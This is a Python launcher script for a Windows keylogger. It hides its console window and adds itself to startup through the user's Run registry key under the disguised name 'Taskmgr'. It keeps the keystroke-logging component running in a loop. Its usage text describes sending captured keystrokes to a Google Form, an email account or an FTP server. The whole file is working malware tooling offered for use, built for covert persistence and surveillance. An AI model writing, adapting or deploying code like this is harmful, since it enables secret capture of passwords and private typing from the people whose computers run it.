#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import time
import psutil
import sys
import win32event
import win32api
import winerror
import win32console
import win32gui
from subprocess import Popen
from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import random

# CONSTANTS
TIME_TO_SLEEP = 10  # in seconds
PYTHON_EXEC_PATH = 'python'  # 'C:\\Temp\\python27\\python.exe'

# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy_main')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple instances are not allowed")
    exit(0)

full_path = os.path.dirname(os.path.realpath(__file__))
file_name = "logger.py"
current_file_name = sys.argv[0].split('/')[-1]
new_file_path = full_path + "\\" + file_name


def hide():
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


def msg():
    print(
    """\n \nPython Keylogger for Windows

USAGE: logger_main.py mode [startup] [encrypt]

mode:
     local: store the logs in a file [current_date.txt]

     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.

     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).

     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).

[optional] startup: add the keylogger to windows startup.

[optional] encrypt: encrypt the logs with a public key provided in logger.py.\n\n""")
    return True


# Add to startup for persistence
def add_to_startup(mode, encryption_on):
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
                         key_val, 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, 'CMD /k "cd ' + full_path +
                   ' && ' + PYTHON_EXEC_PATH + ' "' + full_path + '\\' +
                   current_file_name.replace(full_path + '\\', "") + '" ' + ' '.join([mode, 'startup']) +
                   (' encrypt' if encryption_on else '') + '"')
    except Exception as e:
        print(e)


def maintain_keylogger_instance(mode, encryption_on):
    new_instance_pid = random.getrandbits(256)          # 256bit number to ensure no collisions
    if encryption_on:
        cmdline = [PYTHON_EXEC_PATH, new_file_path, mode, 'encrypt']
    else:
        cmdline = [PYTHON_EXEC_PATH, new_file_path, mode]
    while True:
        is_running = False
        for process in psutil.process_iter():
            try:
                if process.pid == new_instance_pid:
                    is_running = True
                    print('already running, okay')
                    break
            except Exception as e:
                print(e)
        if not is_running:
            print('launching an instance')
            instance = Popen(cmdline)  # don't use shell=True here.
            new_instance_pid = instance.pid
        time.sleep(10)


def main():
    if len(sys.argv) == 1:
        sys.argv = [sys.argv[0], 'local', 'encrypt', 'startup']
    # General precautions
    elif len(sys.argv) > 10:                   # limit the number of args
        msg()
        exit(0)
    if any([len(k) > 260 for k in sys.argv]):  # limit the length of args
        msg()
        exit(0)
    mode = [k for k in sys.argv if k in ["local", "remote", "email", "ftp", "debug"]]
    if len(mode) > 0:
        mode = mode[0]
        encryption_on = False
        if "encrypt" in sys.argv:
            encryption_on = True
        if "startup" in sys.argv:
            add_to_startup(mode, encryption_on)
        # start
        if mode != "debug":
            hide()
        else:
            print(psutil.Process(os.getpid()).parent())
        maintain_keylogger_instance(mode, encryption_on)
    else:
        msg()
        exit(0)
    return True


if __name__ == '__main__':
    main()
